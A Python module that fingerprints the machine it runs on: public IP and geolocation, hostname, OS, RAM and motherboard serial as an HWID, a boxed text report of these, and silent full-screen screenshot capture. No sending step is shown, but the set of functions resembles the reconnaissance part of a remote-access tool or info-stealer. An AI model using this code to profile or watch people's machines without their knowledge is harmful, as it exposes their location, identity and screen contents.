import os
import platform
import json
import socket
import psutil
import requests
import wmi
import uuid
from PIL import ImageGrab
import io

def get_ip_info():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        ip = response.json().get('ip', 'Unknown')
        
        geo_response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        geo = geo_response.json()
        
        return {
            "ip": ip,
            "city": geo.get("city", "Unknown"),
            "region": geo.get("region", "Unknown"),
            "country": geo.get("country_name", "Unknown"),
            "org": geo.get("org", "Unknown")
        }
    except:
        return {"ip": "Unknown", "city": "Unknown", "region": "Unknown", "country": "Unknown", "org": "Unknown"}

def get_system_info():
    try:
        info = {}
        info['platform'] = platform.system()
        info['platform_release'] = platform.release()
        info['platform_version'] = platform.version()
        info['architecture'] = platform.machine()
        info['hostname'] = socket.gethostname()
        info['processor'] = platform.processor()
        info['ram'] = f"{round(psutil.virtual_memory().total / (1024**3))} GB"
        
        # Get HWID
        c = wmi.WMI()
        for board in c.Win32_BaseBoard():
            info['hwid'] = board.SerialNumber
            break
        
        if 'hwid' not in info:
            info['hwid'] = str(uuid.uuid4())
            
        ip_data = get_ip_info()
        info.update(ip_data)
        
        return info
    except:
        return {"error": "Could not gather system info"}

def get_system_report():
    info = get_system_info()
    report = "╔════════════════════════════════════════╗\n"
    report += "║           SYSTEM INFORMATION           ║\n"
    report += "╠════════════════════════════════════════╣\n"
    for k, v in info.items():
        report += f"║ {k.upper().ljust(15)}: {str(v).ljust(22)} ║\n"
    report += "╚════════════════════════════════════════╝"
    return report

def get_screenshot():
    try:
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        return img_byte_arr.getvalue()
    except:
        return None
